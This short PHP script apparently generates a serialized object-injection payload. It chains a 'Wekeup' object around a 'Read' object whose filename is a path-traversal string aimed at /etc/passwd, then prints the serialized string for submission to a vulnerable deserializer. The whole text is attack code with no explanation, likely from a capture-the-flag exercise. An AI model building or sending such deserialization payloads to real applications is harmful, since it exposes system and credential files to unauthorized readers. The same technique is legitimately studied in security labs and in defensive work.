<?php
require("classes.php");

$first = new Read();
$first->filename = "../../../../../../etc/passwd";

$second = new Wekeup();
$second->tmp = $first;

echo serialize($second);